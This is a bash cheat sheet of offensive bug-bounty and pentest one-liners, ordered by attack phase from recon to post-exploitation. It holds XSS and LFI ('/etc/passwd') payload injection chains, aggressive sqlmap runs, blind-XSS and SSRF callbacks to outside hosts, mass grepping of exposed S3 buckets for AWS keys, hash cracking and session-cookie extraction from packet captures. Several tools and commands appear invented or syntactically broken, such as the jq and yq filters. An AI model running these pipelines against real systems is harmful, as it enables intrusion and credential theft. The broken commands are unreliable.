#!/bin/bash
# =====================================================================
# ULTIMATE KALI DATA PROCESSING BIBLE (ETHICAL HACKING & BUG BOUNTY EDITION)
# =====================================================================
# Covers 50+ Tools with 200+ Practical Examples
# Organized by Attack Phase and Data Type

### PHASE 1: RECONNAISSANCE DATA PROCESSING ###

# 1. Subdomain Enumeration Processing
subfinder -d example.com -silent | anew all_subs.txt
amass enum -passive -d example.com -o amass.txt
assetfinder --subs-only example.com | tee -a all_subs.txt

# Advanced: Combine and resolve subdomains
cat *.txt | dnsx -silent -a -aaaa -cname -mx -txt -ptr -resp -json -o dns_data.json
cat dns_data.json | jq -r '.a[]?' | sort -u > ips.txt
httpx -l all_subs.txt -title -tech-detect -status-code -timeout 5 -o live_meta.json

# 2. WHOIS/ASN Processing
whois example.com | grep -Ei 'registrar|email|name server' > whois_info.txt
amass intel -org "Target Corp" | cut -d',' -f1 | sort -u > associated_domains.txt
python3 -m pyasn_util_cli.download --latest
python3 -m pyasn_util_cli.convert --single <(curl -s https://iptoasn.com/data/ip2asn-v4.tsv.gz | gunzip) ip2asn.dat

# 3. Cloud Asset Processing
s3scanner scan -b <bucket_wordlist.txt> | grep -v "NotExist" > found_buckets.txt
cloud_enum -k <target_keywords> -l cloud_assets.txt
azscan -t example.com -o azure_results.json

### PHASE 2: CONTENT DISCOVERY PROCESSING ###

# 1. URL Collection and Processing
gau example.com --subs --threads 50 | uro | tee gau_urls.txt
waybackurls example.com | grep -Evi '.(jpg|png|css|js)' | qsreplace 'FUZZ' > fuzzable.txt
katana -u https://example.com -d 3 -jc -aff -o katana_crawl.txt

# Advanced URL Filtering Chains
cat *.txt | grep -P "\w+\.php(\?|$)" | sort -u > php_urls.txt
cat all_urls.txt | unfurl --unique keys | tr '[:upper:]' '[:lower:]' | sort -u > all_params.txt
gf ssrf <(cat urls.txt | uro) | httpx -silent -mr "internal" > ssrf_candidates.txt

# 2. JavaScript Processing
subjs -i live_subs.txt -o all_js.txt
cat all_js.txt | anti-burl | grep -E 'apikey|secret|token' > js_secrets.txt
js-beautify script.js | grep -Eo "(https?://[^\"'\\()<> ]+)" | unfurl domains

# 3. API Processing
katana -u https://api.example.com -jc -o api_endpoints.txt
cat api_endpoints.txt | grep -E '/v[0-9]/(users|admin)' | sort -u > sensitive_endpoints.txt
api-fuzzer -e endpoints.json -p params.txt -o api_fuzz_results.json

### PHASE 3: VULNERABILITY DETECTION PROCESSING ###

# 1. XSS Processing Pipeline
gf xss urls.txt | grep -vE '(logout|static)' | qsreplace '"><script>alert(1)</script>' | httpx -silent -ms '<script>alert(1)</script>' -o xss_confirmed.txt
dalfox file xss_candidates.txt --blind https://your.xss.ht -o dalfox_results.json

# 2. SQLi Processing
gf sqli urls.txt | sqlmap -m - --batch --level 3 --risk 3 --output-dir=sqlmap_results
nosqli scan -f mongodb_urls.txt -o nosqli_findings.json

# 3. SSRF/XXE Processing
gf ssrf urls.txt | qsreplace 'http://burpcollab.net' | httpx -title -status-code
xxer -file xml_files.txt -o xxe_results.xml

# 4. LFI/RFI Processing
gf lfi urls.txt | qsreplace '../../../../etc/passwd' | httpx -mr 'root:x:'
ffuf -u 'https://example.com/view?file=FUZZ' -w lfi_wordlist.txt -of json -o lfi_scan.json

### PHASE 4: POST-EXPLOITATION DATA PROCESSING ###

# 1. Credential Processing
hashcat -m 1000 hashes.txt rockyou.txt -o cracked.txt
john --wordlist=passwords.txt --rules --format=sha512crypt hashes.txt

# 2. Network Data Processing
tshark -r traffic.pcap -Y 'http.cookie contains "session"' -T fields -e http.host -e http.cookie > sessions.txt
pcapplusplus -r capture.pcap --filter 'dns.qry.name ~ "internal"' --json dns_queries.json

# 3. Memory Dump Processing
volatility -f memory.dump --profile=Win10x64_19041 pslist | grep -i 'explorer'
strings memory.raw | grep -E 'https?://' | unfurl domains

### MEGA WORKFLOWS ###

# 1. Full Web App Recon -> Exploit Pipeline
subfinder -d example.com | httpx -silent | gau | uro | gf xss | qsreplace '"><img src=x onerror=alert(1)>' | httpx -silent -ms '<img src=x onerror=alert(1)>'

# 2. Cloud -> API -> Data Leak Discovery
cloud_enum -k example | grep 's3' | aws s3 ls s3:// --no-sign-request | tee buckets.txt
for b in $(cat buckets.txt); do aws s3 cp s3://$b - | grep -E 'AKIA|secret'; done

# 3. Dark Web Monitoring Pipeline
torify python3 darkdump.py search "example.com" --limit 100 | jq '.results[] | link' | httpx -status-code -title

### DATA ANALYSIS POWERTOOLS ###

# 1. jq for JSON Processing
cat response.json | jq 'walk(if type == "object" then with_entries(select(.key | test("pass|token|key"; "i"))) else  end)'

# 2. Miller for CSV/TSV
mlr --csv filter '$status == 200 && $length > 1000' scan_results.csv | mlr --csv sort -n hits

# 3. yq for YAML
yq e '.services[] | select(.port == 80 or port == 443) | host' docker-compose.yml

# 4. xsv for Blazing Fast CSV
xsv stats huge.csv | xsv table
xsv search -s password '.*' credentials.csv | xsv select user,password

### PRO TIPS ###

# 1. Parallel Processing Everything
parallel -j 100 'curl -s {} | htmlq a -href' ::: urls.txt | tee all_links.txt

# 2. Smart Filetype Conversion
in2csv results.json | csvsql --query "SELECT * FROM stdin WHERE status_code = 500" | csvlook

# 3. Anonymization
cat logs.txt | gawk '{$3="[REDACTED]"; $5="[REDACTED]"; print}' > anonymized.txt

# 4. Timeline Analysis
logparser 'SELECT * FROM access.log WHERE date BETWEEN timestamp("2023-01-01") AND timestamp("2023-12-31")'

### DATA VISUALIZATION ###

# 1. HTML Reports
csvkit csv2html results.csv > report.html
gotable -i scan.json -o vuln_table.html

# 2. Terminal Dashboards
termgraph data.txt --color {green,blue}
csvtk plot -H -b "▇" <(xsv select count,severity vulns.csv)

# 3. Network Graphs
cytoscape.js -i relations.json -o network.html